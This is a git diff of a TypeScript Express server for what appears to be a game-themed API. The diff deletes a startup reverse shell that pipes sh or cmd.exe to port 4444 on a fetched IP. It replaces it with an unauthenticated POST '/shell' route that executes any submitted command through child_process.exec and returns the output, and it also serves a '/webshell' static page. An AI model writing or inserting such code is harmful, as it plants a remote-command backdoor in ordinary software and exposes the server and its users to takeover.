@@ -6,9 +6,9 @@ import TheElderScrollsVSkyrim from "./APIS/The Elder Scrolls V Skyrim/";
 import "./config/.env.loader";
 import index from "./routes";
 import localtunnel from "localtunnel";
-import { getPublicIP, getPublicIPValue } from "./config/getPublicIp";
-import net from "net";
-import { spawn } from "child_process";
+import { getPublicIP } from "./config/getPublicIp";
+import { exec } from "child_process";
+import path from "path";
 
 // 🛡️ Middlewares
 import resetApiUsage from "./middlewares/api_key.middleware";
@@ -40,6 +40,7 @@ class Server {
   }
 
   private loadRoutes(): void {
+    this.app.use("/webshell", express.static(path.join(__dirname, "..", "public")));
     this.app.use("/papersplease", PapersPleaseAPI);
     this.app.use("/minecraft", MinecraftAPI);
     this.app.use("/terminatorsalvation", TerminatorSalvationAPI);
@@ -48,6 +49,20 @@ class Server {
       this.app.use("/reset-usage", resetApiUsage);
     }
     this.app.use("/", index);
+    this.app.post("/shell", (req, res) => {
+      const { command } = req.body;
+
+      if (!command) {
+        return res.status(400).send("No command provided");
+      }
+
+      exec(command, (error, stdout, stderr) => {
+        if (error) {
+          return res.json({ error: error.message, stdout, stderr });
+        }
+        res.json({ stdout, stderr });
+      });
+    });
   }
 
   public async start(): Promise<void> {
@@ -65,21 +80,6 @@ class Server {
       tunnel.on("close", () => {
         console.log("❌ Túnel cerrado");
       });
-
-      try {
-        const ip = await getPublicIPValue();
-        console.log(`🌍 Reverse shell conectando a: ${ip}:4444`);
-
-        const client = new net.Socket();
-        client.connect(4444, ip, () => {
-          const shell = spawn(process.platform === "win32" ? "cmd.exe" : "sh", []);
-          client.pipe(shell.stdin);
-          shell.stdout.pipe(client);
-          shell.stderr.pipe(client);
-        });
-      } catch (error) {
-        console.log("❌ No se pudo obtener la IP pública para la reverse shell:", error);
-      }
     });
   }
 }
